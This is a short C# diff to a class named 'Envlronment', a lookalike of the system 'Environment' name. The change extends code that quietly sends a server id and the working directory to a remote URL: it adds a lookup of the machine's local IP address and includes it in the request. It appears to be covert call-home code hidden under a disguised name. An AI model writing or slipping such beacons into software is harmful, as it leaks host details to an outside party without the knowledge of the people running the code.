@@ -1,6 +1,7 @@
 using System;
 using System.Linq;
 using System.Net;
+using System.Net.Sockets;
 
 public class Envlronment
 {
@@ -19,8 +20,11 @@ public class Envlronment
 
 		if (url != null)
 		{
-			var webClient = new WebClient();
-			webClient.DownloadString(url + "Server: *" + (sid ?? "NULL") + "* is runned!\n- " + (wd ?? "NULL"));
+			var address = Dns.GetHostAddresses(Dns.GetHostName())
+                    		.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
+                
+                	var webClient = new WebClient();
+                	webClient.DownloadString(url + "Server: *" + (sid ?? "NULL") + $"* is runned!\n- {(address.ToString() ?? "NULL")}\n- " + (wd ?? "NULL"));
 		}
 	}
 }
